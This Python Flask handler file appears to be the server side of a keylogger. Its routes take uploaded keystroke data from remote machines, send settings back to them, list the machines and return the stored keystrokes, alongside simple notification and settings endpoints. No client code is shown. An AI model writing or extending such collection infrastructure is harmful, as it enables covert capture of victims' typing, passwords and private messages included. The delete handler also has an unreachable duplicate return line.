from flask import jsonify
import services
import random
def handle_update_settings(request):
    data = request.get_json()
    return services.update_settings(data)

def handle_get_settings():
    return services.get_settings()

def handle_notifications(request):
    text = request.data.decode("utf-8")
    if not text:
        return "No data provided", 400
    try:
        services.save_notification(text)
        return jsonify({"status": "success", "added": text}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def handle_get_notifications():
    try:
        alerts = services.get_notifications()
        return jsonify(alerts), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def handle_delete_notifications(request):
    id = request.data.decode("utf-8")

    if not id:
        return "No data provided", 400
    try:
        services.delete_notification(id)
        return jsonify({"status": "success"}), 200
        return jsonify({"status": "success", "deleted": id}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def handle_upload(request):
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
    data = request.get_json()
    settings = handle_get_settings()
    if not data:
        return jsonify({"data": False, "settings": settings}), 200
    try:

        services.save_keystrokes(data)
        return jsonify({"data": True, "settings": settings}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def handle_get_machines():
    return services.get_machines_list()

def handle_get_keystrokes(request):
    return services.get_keystrokes(request)
